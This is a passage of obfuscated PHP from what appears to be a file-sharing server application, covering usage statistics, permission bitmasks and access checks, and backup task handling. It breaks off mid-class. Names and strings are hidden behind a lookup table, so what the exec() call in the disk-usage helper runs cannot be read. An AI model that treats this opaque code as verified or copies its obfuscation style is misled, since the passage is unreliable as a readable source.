$±ª‚§­Ö = 0; do { $ÇÌ­õ¾¶ = date($²ÌÏÙü´[1908], $Ìë“œƒÜ - 3600 * 24 * 7 * $±ª‚§­Ö); $ÃšÆ›Úú[] = $ÇÌ­õ¾¶; $±ª‚§­Ö++; } while ($çºüöË¨ < $ÇÌ­õ¾¶); break; case $²ÌÏÙü´[1751]: $±ª‚§­Ö = 1; do { $úÏŠÚš = date($²ÌÏÙü´[1927], strtotime("\55\40{$±ª‚§­Ö}\40\x6d\157\x6e\164\x68\163")); $ÃšÆ›Úú[] = $úÏŠÚš; $±ª‚§­Ö++; } while ($çºüöË¨ < $úÏŠÚš); break; case $²ÌÏÙü´[1928]: $ìó²ñˆÑ = (int) date($²ÌÏÙü´[1926], strtotime($çºüöË¨)); $ÄñÅíå² = (int) date($²ÌÏÙü´[1926]); if ($ìó²ñˆÑ >= $ÄñÅíå²) { break; } for ($ìó²ñˆÑ; $ìó²ñˆÑ < $ÄñÅíå²; $ìó²ñˆÑ++) { $ÃšÆ›Úú[] = $ìó²ñˆÑ . $²ÌÏÙü´[1929]; } break; default: break; } if ($çºüöË¨ > end($ÃšÆ›Úú)) { array_pop($ÃšÆ›Úú); } sort($ÃšÆ›Úú); return $ÃšÆ›Úú; } public function listTable($Ã÷ËÈ‰…) { $†©¦ãü = ucfirst($Ã÷ËÈ‰…); return Model($†©¦ãü)->listData(); } public function option($ÂÙ±ë…) { $‚ˆøë = $_SERVER[ÕŸ²ó÷å][1930] . ucfirst($ÂÙ±ë…); return $this->{$‚ˆøë}(); } private function optionUser() { $Ü¢åªç =& $_SERVER[ÕŸ²ó÷å]; $—¢¦¨å½ = Model($Ü¢åªç[607])->count($Ü¢åªç[1773]); $ş‰†•ÄÑ = Model($Ü¢åªç[607])->where($Ü¢åªç[1931])->count($Ü¢åªç[1773]); $Œ¨š™¶ä = intval($GLOBALS[$Ü¢åªç[6]][$Ü¢åªç[434]][$Ü¢åªç[1719]]) / 3600; $«¤ÚíÜ§ = strtotime("\55{$Œ¨š™¶ä}\x20\150\157\165\162\x73"); $¡¼ñÚ”ı = strtotime(date($Ü¢åªç[1912])); if ($«¤ÚíÜ§ < $¡¼ñÚ”ı) { $«¤ÚíÜ§ = $¡¼ñÚ”ı; } $ö„¤×„ = array($Ü¢åªç[1932] => array($Ü¢åªç[1095], $«¤ÚíÜ§)); $Ë°­©Öô = (int) Model($Ü¢åªç[607])->where($ö„¤×„)->count($Ü¢åªç[1773]); if (!$Ë°­©Öô) { $Ë°­©Öô = 1; } $ö„¤×„ = array($Ü¢åªç[1932] => array($Ü¢åªç[1095], $¡¼ñÚ”ı)); $¨â‘¥Ú = Model($Ü¢åªç[607])->where($ö„¤×„)->count($Ü¢åªç[1773]); return array($Ü¢åªç[842] => (int) $—¢¦¨å½, $Ü¢åªç[1933] => (int) ($—¢¦¨å½ - $ş‰†•ÄÑ), $Ü¢åªç[1934] => (int) $ş‰†•ÄÑ, $Ü¢åªç[1935] => (int) $¨â‘¥Ú, $Ü¢åªç[1936] => $Ë°­©Öô); } private function optionFile() { $‚³€èéˆ =& $_SERVER[ÕŸ²ó÷å]; $ÈÅ–Œâ = $this->sourceSize(); $›ú›æâ• = $ÈÅ–Œâ[$‚³€èéˆ[89]]; $ö¦×‹Í = $ÈÅ–Œâ[$‚³€èéˆ[1905]]; $³öãê¼Ó = Model($‚³€èéˆ[908])->where(array($‚³€èéˆ[494] => 0))->count($‚³€èéˆ[203]); $¸ü±àüœ = array($‚³€èéˆ[494] => 0, $‚³€èéˆ[241] => array($‚³€èéˆ[1095], strtotime(date($‚³€èéˆ[1912])))); $Ö€úÎŞ” = Model($‚³€èéˆ[908])->where($¸ü±àüœ)->sum($‚³€èéˆ[89]); $¦Úù = Model($‚³€èéˆ[908])->where($¸ü±àüœ)->count($‚³€èéˆ[203]); return array($‚³€èéˆ[847] => $›ú›æâ•, $‚³€èéˆ[1905] => $ö¦×‹Í, $‚³€èéˆ[1937] => $›ú›æâ• - $ö¦×‹Í, $‚³€èéˆ[1938] => (int) $Ö€úÎŞ”, $‚³€èéˆ[849] => (int) $³öãê¼Ó, $‚³€èéˆ[1939] => (int) $¦Úù); } private function optionAccess() { $ŸÛ¦‰²¥ =& $_SERVER[ÕŸ²ó÷å]; return array($ŸÛ¦‰²¥[842] => $this->typeLogCnt(), $ŸÛ¦‰²¥[120] => $this->typeLogCnt($ŸÛ¦‰²¥[120]), $ŸÛ¦‰²¥[534] => $this->typeLogCnt($ŸÛ¦‰²¥[534]), $ŸÛ¦‰²¥[1940] => $this->typeLogCnt($ŸÛ¦‰²¥[1940]), $ŸÛ¦‰²¥[1941] => $this->typeLogCnt($ŸÛ¦‰²¥[1941]), $ŸÛ¦‰²¥[671] => $this->typeLogCnt($ŸÛ¦‰²¥[12], $ŸÛ¦‰²¥[1916])); } private function typeLogCnt($¼¼´õ­õ = '', $’åÈÎê = "\x69\144") { $­ÆªÌß€ =& $_SERVER[ÕŸ²ó÷å]; $óÙøÔ€è = array($­ÆªÌß€[120] => array($­ÆªÌß€[1942], $­ÆªÌß€[1943]), $­ÆªÌß€[534] => array($­ÆªÌß€[1944], $­ÆªÌß€[1945]), $­ÆªÌß€[1940] => array($­ÆªÌß€[1946], $­ÆªÌß€[1947], $­ÆªÌß€[1948]), $­ÆªÌß€[1941] => array($­ÆªÌß€[1949], $­ÆªÌß€[1950]), $­ÆªÌß€[1951] => array($­ÆªÌß€[1952], $­ÆªÌß€[1953], $­ÆªÌß€[1954])); $šêÕŒÃ‰ = strtotime(date($­ÆªÌß€[1912])); $¼Şå©­Ø = array($­ÆªÌß€[241] => array($­ÆªÌß€[1095], $šêÕŒÃ‰)); if ($¼¼´õ­õ) { $¼Şå©­Ø[$­ÆªÌß€[33]] = array($­ÆªÌß€[7], $óÙøÔ€è[$¼¼´õ­õ]); } $ĞøÀƒë© = Model($­ÆªÌß€[1915])->where($¼Şå©­Ø)->count($’åÈÎê); return (int) $ĞøÀƒë©; } private function optionServer() { $Û—ã±ı =& $_SERVER[ÕŸ²ó÷å]; $‰€«½éä = $this->diskDriver(); $Å­¨Óâ™ = KodIO::defaultDriver(); $ÁÒüşÄñ = array($Û—ã±ı[901] => $Å­¨Óâ™[$Û—ã±ı[484]]); $¸Ôø™ş  = Model($Û—ã±ı[553])->where($ÁÒüşÄñ)->sum($Û—ã±ı[89]); $¦ş³Œ = explode($Û—ã±ı[53], $_SERVER[$Û—ã±ı[157]]); $ø¯ß¦ = $¦ş³Œ[0]; $û…Ôû×€ = $GLOBALS[$Û—ã±ı[6]][$Û—ã±ı[21]]; $´”ß´µÅ = $û…Ôû×€[$Û—ã±ı[1057]]; if ($´”ß´µÅ == $Û—ã±ı[1045]) { $¸çÒÜ‘ = explode($Û—ã±ı[1371], $û…Ôû×€[$Û—ã±ı[1056]]); $´”ß´µÅ = $¸çÒÜ‘[0]; } if ($´”ß´µÅ == $Û—ã±ı[993] || $´”ß´µÅ == $Û—ã±ı[888]) { $¯ö«Ù¶ù = Model()->db()->query($Û—ã±ı[1955]); $ì¹àã•Í = $¯ö«Ù¶ù[0] && isset($¯ö«Ù¶ù[0][$Û—ã±ı[1661]]) ? $¯ö«Ù¶ù[0][$Û—ã±ı[1661]] : 0; $´”ß´µÅ = $Û—ã±ı[1956] . ($ì¹àã•Í ? $Û—ã±ı[8] . $ì¹àã•Í : $Û—ã±ı[12]); } $ÓÆÒ±ÓØ = $GLOBALS[$Û—ã±ı[6]][$Û—ã±ı[434]][$Û—ã±ı[910]]; return array($Û—ã±ı[1957] => $‰€«½éä ? $‰€«½éä[$Û—ã±ı[1958]] : 0, $Û—ã±ı[1959] => $‰€«½éä ? $‰€«½éä[$Û—ã±ı[1960]] : 0, $Û—ã±ı[1961] => (int) $Å­¨Óâ™[$Û—ã±ı[1958]] * 1024 * 1024 * 1024, $Û—ã±ı[1962] => (int) $¸Ôø™ş , $Û—ã±ı[1963] => ucfirst($ø¯ß¦), $Û—ã±ı[1964] => $Û—ã±ı[1965] . PHP_VERSION, $Û—ã±ı[1966] => phpBuild64() ? 64 : 32, $Û—ã±ı[841] => str_replace($Û—ã±ı[1214], $Û—ã±ı[1073], $´”ß´µÅ), $Û—ã±ı[434] => ucfirst($ÓÆÒ±ÓØ), $Û—ã±ı[32] => $_SERVER[$Û—ã±ı[1967]]); } private function diskDriver() { $›ùüÀ¹ğ =& $_SERVER[ÕŸ²ó÷å]; $ìÈ¡«…ä = $›ùüÀ¹ğ[8]; $¹Î÷ÁÂë = $GLOBALS[$›ùüÀ¹ğ[6]][$›ùüÀ¹ğ[1388]] == $›ùüÀ¹ğ[1389]; if ($¹Î÷ÁÂë) { $ìÈ¡«…ä = $›ùüÀ¹ğ[1968]; if (function_exists($›ùüÀ¹ğ[1969])) { exec($›ùüÀ¹ğ[1970], $È¹ŠŒ‡è); $ìÈ¡«…ä = $È¹ŠŒ‡è[1] . $›ùüÀ¹ğ[8]; } } if (!file_exists($ìÈ¡«…ä)) { return; } if (!function_exists($›ùüÀ¹ğ[1971])) { return; } $¬ï‘¡Ç³ = @disk_total_space($ìÈ¡«…ä); $—İÃş = $¬ï‘¡Ç³ - @disk_free_space($ìÈ¡«…ä); return array($›ùüÀ¹ğ[1958] => $¬ï‘¡Ç³, $›ùüÀ¹ğ[1960] => $—İÃş); } public function fileChart($Äàº¬ß) { $ë–Õ =& $_SERVER[ÕŸ²ó÷å]; if (isset($Äàº¬ß[$ë–Õ[1773]])) { return Model($ë–Õ[908])->userFileTypeProfile($Äàº¬ß[$ë–Õ[1773]]); } if (isset($Äàº¬ß[$ë–Õ[1972]])) { return Model($ë–Õ[908])->groupFileTypeProfile($Äàº¬ß[$ë–Õ[1972]]); } $€£ÛÎéß = $this->sourceSize(); $”çœØîĞ = array($ë–Õ[202] => 0, $ë–Õ[200] => 1); $ùŞÛêö = Model($ë–Õ[908])->where($”çœØîĞ)->sum($ë–Õ[89]); $”çœØîĞ[$ë–Õ[200]] = 2; $ç¢‚ÄÀ´ = Model($ë–Õ[908])->where($”çœØîĞ)->sum($ë–Õ[89]); return array($ë–Õ[847] => $€£ÛÎéß[$ë–Õ[89]], $ë–Õ[1905] => $€£ÛÎéß[$ë–Õ[1905]], $ë–Õ[1906] => (int) $ùŞÛêö, $ë–Õ[1907] => (int) $ç¢‚ÄÀ´); } private function sourceSize() { $¯İ¢¾›µ =& $_SERVER[ÕŸ²ó÷å]; $°¶¢Ù•ƒ = Model($¯İ¢¾›µ[908])->where(array($¯İ¢¾›µ[494] => 0))->sum($¯İ¢¾›µ[89]); $ÆšÌò¼ = Model($¯İ¢¾›µ[553])->sum($¯İ¢¾›µ[89]); if ($ÆšÌò¼ > $°¶¢Ù•ƒ) { $ÆšÌò¼ = $°¶¢Ù•ƒ; } return array($¯İ¢¾›µ[89] => (int) $°¶¢Ù•ƒ, $¯İ¢¾›µ[1905] => (int) $ÆšÌò¼); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ù¯¨¼Èğ =& $_SERVER[ÕŸ²ó÷å]; $„¦€ê’— = array(array($ù¯¨¼Èğ[503] => LNG($ù¯¨¼Èğ[1973]), $ù¯¨¼Èğ[1974] => $ù¯¨¼Èğ[1975], $ù¯¨¼Èğ[1976] => 1, $ù¯¨¼Èğ[1977] => 1, $ù¯¨¼Èğ[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ù¯¨¼Èğ[503] => LNG($ù¯¨¼Èğ[1979]), $ù¯¨¼Èğ[1974] => $ù¯¨¼Èğ[1980], $ù¯¨¼Èğ[1976] => 2, $ù¯¨¼Èğ[1977] => 1, $ù¯¨¼Èğ[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ù¯¨¼Èğ[503] => LNG($ù¯¨¼Èğ[1981]), $ù¯¨¼Èğ[1974] => $ù¯¨¼Èğ[1982], $ù¯¨¼Èğ[1976] => 3, $ù¯¨¼Èğ[1977] => 1, $ù¯¨¼Èğ[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ù¯¨¼Èğ[503] => LNG($ù¯¨¼Èğ[1983]), $ù¯¨¼Èğ[1974] => $ù¯¨¼Èğ[1984], $ù¯¨¼Èğ[1976] => 4, $ù¯¨¼Èğ[1977] => 1, $ù¯¨¼Èğ[1978] => self::AUTH_SHOW | self::AUTH_VIEW), array($ù¯¨¼Èğ[503] => LNG($ù¯¨¼Èğ[1985]), $ù¯¨¼Èğ[1974] => $ù¯¨¼Èğ[1986], $ù¯¨¼Èğ[1976] => 5, $ù¯¨¼Èğ[1977] => 1, $ù¯¨¼Èğ[1978] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ù¯¨¼Èğ[503] => LNG($ù¯¨¼Èğ[1987]), $ù¯¨¼Èğ[1974] => $ù¯¨¼Èğ[1988], $ù¯¨¼Èğ[1976] => 6, $ù¯¨¼Èğ[1977] => 1, $ù¯¨¼Èğ[1978] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ù¯¨¼Èğ[503] => LNG($ù¯¨¼Èğ[1989]), $ù¯¨¼Èğ[1974] => $ù¯¨¼Èğ[1990], $ù¯¨¼Èğ[1976] => 7, $ù¯¨¼Èğ[1977] => 1, $ù¯¨¼Èğ[1978] => 0)); return $„¦€ê’—; } public static function authCheck($ÆòşÛÌõ, $ÙÂÏ¨’‰) { $ı ¯šÔ™ =& $_SERVER[ÕŸ²ó÷å]; $ÆòşÛÌõ = intval($ÆòşÛÌõ); if (KodUser::isRoot() && $GLOBALS[$ı ¯šÔ™[6]][$ı ¯šÔ™[1991]]) { return !0; } if ($ÆòşÛÌõ <= 0) { return !1; } if (($ÆòşÛÌõ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÆòşÛÌõ & $ÙÂÏ¨’‰); } public static function authCheckShow($„È÷©ì÷) { return self::authCheck($„È÷©ì÷, self::AUTH_SHOW); } public static function authCheckView($¢â”©¾) { return self::authCheck($¢â”©¾, self::AUTH_VIEW); } public static function authCheckDownload($§äÄÊöÂ) { return self::authCheck($§äÄÊöÂ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ØÁ¨ë»é) { return self::authCheck($ØÁ¨ë»é, self::AUTH_UPLOAD); } public static function authCheckEdit($Ì“±ì) { return self::authCheck($Ì“±ì, self::AUTH_EDIT); } public static function authCheckRemove($„ôïŒÛè) { return self::authCheck($„ôïŒÛè, self::AUTH_REMOVE); } public static function authCheckShare($·¶ñ™­) { return self::authCheck($·¶ñ™­, self::AUTH_SHARE); } public static function authCheckComment($ŸØ†á—‘) { return self::authCheck($ŸØ†á—‘, self::AUTH_COMMENT); } public static function authCheckEvent($ŠÒìÓÄè) { return self::authCheck($ŠÒìÓÄè, self::AUTH_EVENT); } public static function authCheckRoot($°‰ôØ¯) { return self::authCheck($°‰ôØ¯, self::AUTH_ROOT); } public static function authCheckAction($ÃµµœÄ, $ÒùÍ’õó) { $Â‹şí«© =& $_SERVER[ÕŸ²ó÷å]; $†§ºá™ƒ = array($Â‹şí«©[1992] => self::AUTH_VIEW, $Â‹şí«©[1282] => self::AUTH_DOWNLOAD, $Â‹şí«©[120] => self::AUTH_UPLOAD, $Â‹şí«©[1941] => self::AUTH_EDIT, $Â‹şí«©[1940] => self::AUTH_REMOVE, $Â‹şí«©[1951] => self::AUTH_SHARE, $Â‹şí«©[439] => self::AUTH_COMMENT, $Â‹şí«©[1761] => self::AUTH_EVENT, $Â‹şí«©[1993] => self::AUTH_ROOT); if (!isset($†§ºá™ƒ[$ÒùÍ’õó])) { return; } $üïİşÜû = $†§ºá™ƒ[$ÒùÍ’õó]; $ÃµµœÄ = intval($ÃµµœÄ); if ($ÃµµœÄ <= 0) { return !1; } if (($ÃµµœÄ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÃµµœÄ & $üïİşÜû); } public static function authDisable($¶ò½„ß, $âÜÏ©¢«) { if (intval($¶ò½„ß) <= 0) { return 0; } return intval($¶ò½„ß) & ~$âÜÏ©¢«; } public $optionType = "\123\x79\163\x74\x65\155\56\x73\x6f\165\x72\143\145\101\165\164\150\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\145", "\141\x75\x74\150", "\154\141\142\145\x6c", "\x64\151\163\x70\x6c\x61\171", "\163\171\x73\164\x65\155", "\163\x6f\162\164"); public function initData() { $ÖÍî–È« = $this->authDefault(); foreach ($ÖÍî–È« as $ãî­éúĞ) { $this->add($ãî­éúĞ); } } public function findAuth($Ëœü‡œ, $Ê±‡¶û) { $¤æåã­à =& $_SERVER[ÕŸ²ó÷å]; $õıÈ“ = parent::listData(); foreach ($õıÈ“ as $¾ö±ƒ¯ˆ) { $•ñÑîû = intval($¾ö±ƒ¯ˆ[$¤æåã­à[496]]); if ($•ñÑîû <= 0 || $¾ö±ƒ¯ˆ[$¤æåã­à[1994]] == 0) { continue; } if (($•ñÑîû & $Ëœü‡œ) != $Ëœü‡œ) { continue; } if (($•ñÑîû & $Ê±‡¶û) != 0) { continue; } return $¾ö±ƒ¯ˆ[$¤æåã­à[484]]; } return !1; } public function findAuthReadOnly() { $‚”™±© = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ãÍª®èï = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($‚”™±©, $ãÍª®èï); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $©¹´Ëùµ =& $_SERVER[ÕŸ²ó÷å]; $–˜áüƒã = parent::listData(); $½ÙŠìü» = !1; foreach ($–˜áüƒã as $ŞÆÆŞˆ¼) { if ($ŞÆÆŞˆ¼[$©¹´Ëùµ[496]] <= 0 || $ŞÆÆŞˆ¼[$©¹´Ëùµ[1994]] == $©¹´Ëùµ[238]) { continue; } if (!$½ÙŠìü») { $½ÙŠìü» = $ŞÆÆŞˆ¼; continue; } if ($½ÙŠìü»[$©¹´Ëùµ[496]] > $ŞÆÆŞˆ¼[$©¹´Ëùµ[496]]) { $½ÙŠìü» = $ŞÆÆŞˆ¼; } } return $½ÙŠìü» ? $½ÙŠìü»[$©¹´Ëùµ[484]] : $©¹´Ëùµ[12]; } public function listData($ääáÜŸ = false, $­®ãÛ›š = "\163\157\x72\x74", $ÉÕÖ¨ì¬ = false) { return parent::listData($ääáÜŸ, $­®ãÛ›š, $ÉÕÖ¨ì¬); } public function update($Ú‡çÁœÜ, $àªÔÇƒ¯) { $âîğ©òŠ =& $_SERVER[ÕŸ²ó÷å]; $Ş½áŞ×Ç = parent::listData($Ú‡çÁœÜ); $ñÊÜòöÆ = $this->findByName($àªÔÇƒ¯[$âîğ©òŠ[32]]); if (!$Ş½áŞ×Ç || $ñÊÜòöÆ && $ñÊÜòöÆ[$âîğ©òŠ[484]] != $Ş½áŞ×Ç[$âîğ©òŠ[484]]) { return !1; } $this->filterAuth($àªÔÇƒ¯[$âîğ©òŠ[496]]); return parent::update($Ú‡çÁœÜ, $àªÔÇƒ¯); } public function remove($ü¾çÈËÛ) { $‡úÃ÷…ã = parent::listData($ü¾çÈËÛ); if (!$‡úÃ÷…ã || $‡úÃ÷…ã[$_SERVER[ÕŸ²ó÷å][201]]) { return !1; } return parent::remove($ü¾çÈËÛ); } public function add($ûû¤æíô = array()) { $Ü¦Üíç =& $_SERVER[ÕŸ²ó÷å]; if ($this->findByName($ûû¤æíô[$Ü¦Üíç[32]])) { return !1; } $½Õ‘ÅÇ‚ = array($Ü¦Üíç[32] => $Ü¦Üíç[12], $Ü¦Üíç[496] => 1, $Ü¦Üíç[1995] => $Ü¦Üíç[1982], $Ü¦Üíç[1994] => 1, $Ü¦Üíç[201] => 0, $Ü¦Üíç[1996] => 0); $ûû¤æíô = array_merge($½Õ‘ÅÇ‚, $ûû¤æíô); $ûû¤æíô[$Ü¦Üíç[1996]] = $this->getSort(); $this->filterAuth($ûû¤æíô[$Ü¦Üíç[496]]); return parent::insert($ûû¤æíô); } private function getSort() { $çæ“°—ç =& $_SERVER[ÕŸ²ó÷å]; $ÓŸ¯©í = parent::listData(); $ƒµÃÅÅı = array_to_keyvalue($ÓŸ¯©í, $çæ“°—ç[12], $çæ“°—ç[1996]); return empty($ƒµÃÅÅı) ? 0 : max($ƒµÃÅÅı) + 1; } private function filterAuth(&$„¯óæå§) { if (!$„¯óæå§) { return; } $äÙæ¼á = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¿ïÂ× = array(); foreach ($äÙæ¼á as $ìî×ä Å) { if ($„¯óæå§ & $ìî×ä Å) { $¿ïÂ×[] = $ìî×ä Å; } } if (in_array(self::AUTH_ROOT, $¿ïÂ×)) { $„¯óæå§ = array_sum($äÙæ¼á); return; } $¬Ê•°’Ë = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¿ïÂ× as $ìî×ä Å) { if (isset($¬Ê•°’Ë[$ìî×ä Å])) { $¿ïÂ× = array_merge($¿ïÂ×, $¬Ê•°’Ë[$ìî×ä Å]); } } $¿ïÂ×[] = self::AUTH_SHOW; $„¯óæå§ = array_sum(array_unique($¿ïÂ×)); } public function sort($ÆŒ¹ª, $à¤Åçåİ) { return parent::update($ÆŒ¹ª, $à¤Åçåİ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\142\x61\x63\x6b\x75\160\x4c\x69\x73\164"; public $field = array("\x69\157", "\156\x61\155\145", "\163\164\141\x74\x75\163", "\143\x6f\156\164\x65\x6e\x74", "\155\141\x6e\165\141\154", "\162\145\x73\x75\x6c\x74", "\x74\151\x6d\145\106\x72\157\155", "\164\x69\155\x65\124\x6f"); public function config() { $»Öİ¥òô =& $_SERVER[ÕŸ²ó÷å]; Action($»Öİ¥òô[1997])->taskInit(); $µõ’Õ » = Model($»Öİ¥òô[854])->get($»Öİ¥òô[867]); $µõ’Õ » = json_decode($µõ’Õ », !0); $µõ’Õ » = is_array($µõ’Õ ») ? $µõ’Õ » : array(); $this->parseContent($µõ’Õ »); unset($µõ’Õ »[$»Öİ¥òô[1743]]); Model($»Öİ¥òô[1742])->cacheClear(); $ÔŞà„ = $»Öİ¥òô[1998]; $ÕÉàË® = Model($»Öİ¥òô[1999])->findByKey($»Öİ¥òô[1761], $ÔŞà„); if (!$ÕÉàË®) { $ÕÉàË® = array(); } if (isset($ÕÉàË®[$»Öİ¥òô[216]])) { $ÕÉàË®[$»Öİ¥òô[216]] = json_decode($ÕÉàË®[$»Öİ¥òô[216]], !0); } if (isset($µõ’Õ »[$»Öİ¥òô[216]])) { $ÕÉàË®[$»Öİ¥òô[216]][$»Öİ¥òô[1746]] = $µõ’Õ »[$»Öİ¥òô[216]]; unset($µõ’Õ »[$»Öİ¥òô[216]]); } return array_merge($ÕÉàË®, $µõ’Õ »); } public function listData($±Óúä«¡ = false, $ñ–Ê„É° = "\x6d\x6f\x64\151\146\171\x54\151\155\x65", $¹öÀùû¶ = false) { $ÃåÇäöñ = parent::listData($±Óúä«¡, $ñ–Ê„É°, !0); if (!$ÃåÇäöñ) { return $ÃåÇäöñ; } if ($±Óúä«¡) { $ÃåÇäöñ = array($ÃåÇäöñ); } foreach ($ÃåÇäöñ as &$«÷é™ö–) { $this->parseContent($«÷é™ö–); } return $±Óúä«¡ ? $ÃåÇäöñ[0] : $ÃåÇäöñ; } public function parseContent(&$Ã»Ğ°Úï) { $áÉé–¨ö =& $_SERVER[ÕŸ²ó÷å]; $ç‘Ùó¿ = _get($Ã»Ğ°Úï, $áÉé–¨ö[181], $áÉé–¨ö[101]); if (!in_array($ç‘Ùó¿, array($áÉé–¨ö[860], $áÉé–¨ö[1214]))) { $Ã»Ğ°Úï[$áÉé–¨ö[181]] = $ç‘Ùó¿ == $áÉé–¨ö[101] ? $áÉé–¨ö[1214] : $áÉé–¨ö[860]; } } public function lastItem() { $ÙÃøàÛµ = $this->listData(); return !empty($ÙÃøàÛµ[0]) ? $ÙÃøàÛµ[0] : null; } public function kill($ÇÕğÌ”Î) { $Áş“«¯ =& $_SERVER[ÕŸ²ó÷å]; $Õ¹…÷‚¨ = $this->listData($ÇÕğÌ”Î); if (!$Õ¹…÷‚¨ || empty($Õ¹…÷‚¨[$Áş“«¯[32]])) { return !0; } Task::kill($Áş“«¯[866]); Task::kill($Áş“«¯[884]); Task::kill($Áş“«¯[893]); $÷—¿Ú¦ = $Õ¹…÷‚¨[$Áş“«¯[32]]; $¤•²¨üš = TEMP_FILES . $Áş“«¯[863] . $÷—¿Ú¦ . $Áş“«¯[8]; IO::remove($¤•²¨üš, !1); return $this->remove($ÇÕğÌ”Î); } public function remove($­ÕŒ’û°) { $«ÇÀ‡æ¥ = $this->listData($­ÕŒ’û°); if (!$«ÇÀ‡æ¥) { return !0; } return $this->backupRemove($«ÇÀ‡æ¥); } private function backupRemove($Ó‰ç‘Â) { parent::remove($Ó‰ç‘Â[$_SERVER[ÕŸ²ó÷å][484]]); $ĞÁÄÕ¹ = $this->backupPath($Ó‰ç‘Â); IO::remove($ĞÁÄÕ¹, !1); return !0; } private function backupPath($³³îŒß) { $Ïéâ„†£ =& $_SERVER[ÕŸ²ó÷å]; $£Ë†áä† = $³³îŒß[$Ïéâ„†£[32]]; $£¶î¸É = Model($Ïéâ„†£[854])->get($Ïéâ„†£[855]); $àí¤¢¶ª = substr(md5($Ïéâ„†£[856] . $£¶î¸É . $£Ë†áä†), 0, 8); return "\x7b\x69\157\72{$³³îŒß[$Ïéâ„†£[836]]}\175\57\144\141\164\x61\x62\141\x73\x65\57\x62\x61\x63\x6b\165\x70\57" . $£Ë†áä† . $Ïéâ„†£[11] . $àí¤¢¶ª; } public function start() { $øŠ«€Ø… =& $_SERVER[ÕŸ²ó÷å]; if ($GLOBALS[$øŠ«€Ø…[6]][$øŠ«€Ø…[102]][$øŠ«€Ø…[2000]] != $øŠ«€Ø…[101]) { return !0; } $€µˆ—  = $this->config(); if (!$€µˆ—  || $€µˆ— [$øŠ«€Ø…[1743]] != $øŠ«€Ø…[101]) { return !1; } if ($€µˆ— [$øŠ«€Ø…[181]] == $øŠ«€Ø…[860]) { $˜±®ÒÃÃ = Model($øŠ«€Ø…[854])->get($øŠ«€Ø…[1327]); if ($˜±®ÒÃÃ == $øŠ«€Ø…[1328]) { $€µˆ— [$øŠ«€Ø…[181]] = $øŠ«€Ø…[1214]; } } $§ú·¤Ø¾ = $this->process(); foreach ($§ú·¤Ø¾ as $¨Ó¬»±ö) { if ($¨Ó¬»±ö) { return Task::restart($¨Ó¬»±ö[$øŠ«€Ø…[484]]); } } $íŞ¿ ´ = new Backup(); $ òİíïû = $íŞ¿ ´->db(); if ($ òİíïû) { $ òİíïû = $íŞ¿ ´->dbFile(); if ($ òİíïû && $€µˆ— [$øŠ«€Ø…[181]] == $øŠ«€Ø…[860]) { $ òİíïû = $íŞ¿ ´->file(); } } Backup::set(array($øŠ«€Ø…[834] => 1, $øŠ«€Ø…[845] => time())); return !0; } public function process() { $Ì£íÔÎÁ =& $_SERVER[ÕŸ²ó÷å]; $•±¯»²ó = array($Ì£íÔÎÁ[841] => Task::get($Ì£íÔÎÁ[866]), $Ì£íÔÎÁ[846] => Task::get($Ì£íÔÎÁ[884]), $Ì£íÔÎÁ[240] => Task::get($Ì£íÔÎÁ[893])); $Û¶Ú­¦Ê = !1; foreach ($•±¯»²ó as &$¨éş·ıû) { if ($Û¶Ú­¦Ê) { $¨éş·ıû = !1; continue; } if ($¨éş·ıû) { $Ëİˆ¢¦ã = intval(_get($¨éş·ıû, $Ì£íÔÎÁ[1778], 0)); if (time() - $Ëİˆ¢¦ã > 7200) { Task::kill($¨éş·ıû[$Ì£íÔÎÁ[484]]); $Û¶Ú­¦Ê = !0; $¨éş·ıû = !1; } } } return $•±¯»²ó; } public function restore() { $õ²¡ÉÇ =& $_SERVER[ÕŸ²ó÷å]; ActionCall($õ²¡ÉÇ[1141], !0, 1); ActionCall($õ²¡ÉÇ[1141], !0, 0); } } goto A’íÙĞÁê—; E¿¿—ßÂ”Ş: class SourceEventModel extends ModelBase { protected $tableName = 